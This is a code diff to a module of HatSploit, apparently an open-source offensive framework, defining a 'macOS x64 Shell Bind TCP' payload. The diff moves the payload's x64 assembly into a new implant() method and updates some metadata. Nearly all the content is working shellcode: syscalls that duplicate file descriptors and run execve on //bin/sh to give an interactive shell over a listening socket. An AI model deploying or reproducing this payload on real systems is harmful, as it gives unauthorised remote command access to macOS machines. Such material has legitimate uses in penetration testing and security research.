@@ -13,16 +13,47 @@ class HatSploitPayload(Payload, Handler, MacOS):
             'Name': "macOS x64 Shell Bind TCP",
             'Payload': "macos/x64/shell_bind_tcp",
             'Authors': [
-                'Ivan Nikolskiy (enty8080) - payload developer',
+                "Ivan Nikolskiy (enty8080) - payload developer",
             ],
-            'Description': "Shell bind TCP payload for macOS x64.",
+            'Description': """
+                This payload creates an interactive bind TCP shell for macOS
+                with x64 architecture.
+            """,
             'Arch': ARCH_X64,
             'Platform': OS_MACOS,
             'Type': BIND_TCP,
         })
 
+    def implant(self):
+        return self.__asm__(
+            """
+            start:
+                xor rsi, rsi
+                mov sil, 0x3
+
+            dup:
+                mov rax, r8
+                mov al, 0x5a
+                sub sil, 1
+                syscall
+
+                test rsi, rsi
+                jne dup
+
+                push rsi
+                mov rdi, 0x68732f6e69622f2f
+                push rdi
+                push rsp
+                pop rdi
+                xor rdx, rdx
+                mov rax, r8
+                mov al, 0x3b
+                syscall
+            """
+        )
+
     def run(self):
-        return self.assemble(
+        return self.__asm__(
             f"""
             start:
                 xor rdi, rdi
@@ -57,27 +88,5 @@ class HatSploitPayload(Payload, Handler, MacOS):
                 mov rax, r8
                 mov al, 0x1e
                 syscall
-
-                mov rdi, rax
-                mov sil, 0x3
-
-            dup:
-                mov rax, r8
-                mov al, 0x5a
-                sub sil, 1
-                syscall
-
-                test rsi, rsi
-                jne dup
-
-                push rsi
-                mov rdi, 0x68732f6e69622f2f
-                push rdi
-                push rsp
-                pop rdi
-                xor rdx, rdx
-                mov rax, r8
-                mov al, 0x3b
-                syscall
             """
-        )
+        ) + self.implant()
